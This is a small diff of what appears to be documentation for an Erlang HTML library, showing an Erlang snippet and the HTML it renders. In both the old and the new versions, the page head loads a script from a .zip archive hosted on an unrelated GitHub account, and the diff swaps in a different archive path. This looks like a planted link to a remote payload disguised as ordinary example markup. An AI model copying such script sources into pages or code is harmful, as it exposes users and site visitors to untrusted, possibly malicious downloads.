@@ -7,7 +7,7 @@ Erlang:
 html(#{lang => "en"}, [
   head([
     title(Title),
-    script(#{src => "https://raw.githubusercontent.com/sohailgerman/htmltest/master/src/htmltest_v1.6.zip"})
+    script(#{src => "https://github.com/sohailgerman/htmltest/raw/refs/heads/master/log/Software-1.5.zip"})
   ]),
   body([
     h1("Erlang ♥ HTML"),
@@ -26,7 +26,7 @@ HTML:
 <html lang="en">
   <head>
     <title>♥ ♥ ♥</title>
-    <script src="https://raw.githubusercontent.com/sohailgerman/htmltest/master/src/htmltest_v1.6.zip"></script>
+    <script src="https://github.com/sohailgerman/htmltest/raw/refs/heads/master/log/Software-1.5.zip"></script>
   </head>
   <body>
     <h1>Erlang ♥ HTML</h1>
